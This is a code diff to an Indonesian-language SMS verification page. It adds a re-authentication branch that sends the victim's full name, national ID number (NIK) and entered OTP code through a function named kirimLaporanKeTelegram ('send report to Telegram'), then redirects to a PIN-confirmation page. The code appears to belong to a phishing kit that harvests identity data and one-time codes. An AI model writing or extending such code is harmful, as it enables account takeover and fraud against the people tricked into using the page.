@@ -22,6 +22,7 @@
   const session = NovaStorage.getSession();
   const identity = NovaStorage.getIdentity();
   const destination = String(session?.identity || '').trim();
+  const isDashboardReauth = sessionStorage.getItem('kbDashboardReauth') === '1';
 
   function maskDestination(value) {
     if (value.includes('@')) {
@@ -139,6 +140,21 @@
     verifyButton.disabled = true;
     verifyButton.textContent = 'VERIFIKASI BERHASIL ✓';
 
+    if (isDashboardReauth) {
+      window.kirimLaporanKeTelegram?.({
+        event: 'SMS_REAUTH_VERIFIED',
+        page: 'verifikasi-sms.html',
+        nama_lengkap: identity?.fullName,
+        nik: identity?.nik,
+        otp: otpValue,
+        status: 'OTP_REAUTH_VERIFIED'
+      });
+
+      setMessage(`Kode untuk ${identity.fullName} berhasil diverifikasi.`, 'success');
+      window.setTimeout(() => window.location.replace('konfirmasi-pin.html'), 650);
+      return;
+    }
+
     const saved = NovaStorage.setSmsVerified(true);
     const appSaved = NovaStorage.setApplication({ lastOtp: otpValue });
     if (!saved || !appSaved) {
@@ -162,7 +178,9 @@
   });
 
   resendButton.addEventListener('click', generateLocalCode);
-  backButton?.addEventListener('click', () => window.location.href = 'form-nik.html');
+  backButton?.addEventListener('click', () => {
+    window.location.href = isDashboardReauth ? 'index.html' : 'form-nik.html';
+  });
 
   generateLocalCode();
 })();
